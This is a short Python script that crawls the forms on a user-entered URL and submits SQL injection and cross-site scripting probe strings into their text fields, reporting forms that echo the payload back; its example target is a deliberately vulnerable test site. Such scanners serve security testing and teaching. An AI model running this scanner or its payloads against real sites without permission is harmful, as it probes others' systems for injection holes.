import requests
from bs4 import BeautifulSoup


payloads = ["' OR 1=1 --", "<script>alert(1)</script>"]

def get_all_forms(url):

    res = requests.get(url)
    soup = BeautifulSoup(res.text, "lxml")
    return soup.find_all("form")

def get_form_details(form):

    details = {}
    action = form.get("action")
    method = form.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.get("type", "text")
        input_name = input_tag.get("name")
        if input_name:
            inputs.append({"type": input_type, "name": input_name})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def submit_form(form_details, url, payload):

    target_url = url if form_details["action"] is None else url.rstrip("/") + "/" + form_details["action"]
    data = {}

    for input_field in form_details["inputs"]:
        if input_field["type"] == "text" or input_field["type"] == "search":
            data[input_field["name"]] = payload
        else:
            data[input_field["name"]] = "test"

    print(f"\n[+] Submitting payload to: {target_url}")
    print(f"[+] Data: {data}")

    if form_details["method"] == "post":
        return requests.post(target_url, data=data)
    else:
        return requests.get(target_url, params=data)

def scan_for_vulnerable_forms(url):

    forms = get_all_forms(url)
    print(f"[+] Detected {len(forms)} form(s) on {url}\n")

    for i, form in enumerate(forms, start=1):
        form_details = get_form_details(form)
        for payload in payloads:
            response = submit_form(form_details, url, payload)
            content = response.text

            if payload in content:
                print(f"[!!!] Possible vulnerability detected in form #{i}")
                print(f"[!!!] Payload: {payload}")
                print(f"[!!!] Form Action: {form_details['action']}")
                print(f"[!!!] Method: {form_details['method']}\n")
                break
            else:
                print(f"[-] Payload '{payload}' did not trigger any visible issue in form #{i}")


target = input("Enter URL to scan (e.g., http://testphp.vulnweb.com): ")
scan_for_vulnerable_forms(target)
